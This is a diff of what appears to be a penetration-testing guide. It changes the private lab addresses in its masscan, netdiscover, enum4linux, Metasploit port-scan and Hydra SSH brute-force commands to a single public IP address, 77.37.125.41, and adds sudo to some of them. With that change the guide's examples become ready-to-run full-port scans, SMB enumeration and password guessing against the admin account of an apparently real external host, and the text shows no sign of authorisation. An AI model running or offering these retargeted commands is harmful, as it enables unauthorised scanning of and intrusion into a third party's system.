@@ -44,11 +44,11 @@
   ```
 - **Masscan**:  
   ```bash
-  masscan 192.168.1.0/24 --rate=1000 -p1-65535
+  sudo masscan 77.37.125.41/24 --rate=1000 -p1-65535
   ```
 - **Netdiscover**:  
   ```bash
-  netdiscover -r 192.168.1.0/24
+  netdiscover -r 77.37.125.41/24
   ```
 
 #### **Step 6: Service Enumeration**
@@ -65,7 +65,7 @@
   ```
 - **Enum4linux**:  
   ```bash
-  enum4linux -a 192.168.1.10
+  sudo enum4linux -a 77.37.125.41 
   ```
 
 #### **Step 7: Vulnerability Scanning**
@@ -77,7 +77,7 @@
   ```bash
   msfconsole
   use auxiliary/scanner/portscan/tcp
-  set RHOSTS 192.168.1.10
+  set RHOSTS 77.37.125.41
   run
   ```
 
@@ -90,7 +90,7 @@
   ```
 - **Hydra**:  
   ```bash
-  hydra -l admin -P /path/to/passwords.txt ssh://192.168.1.10
+  hydra -l admin -P /path/to/passwords.txt ssh://77.37.125.41
   ```
 
  
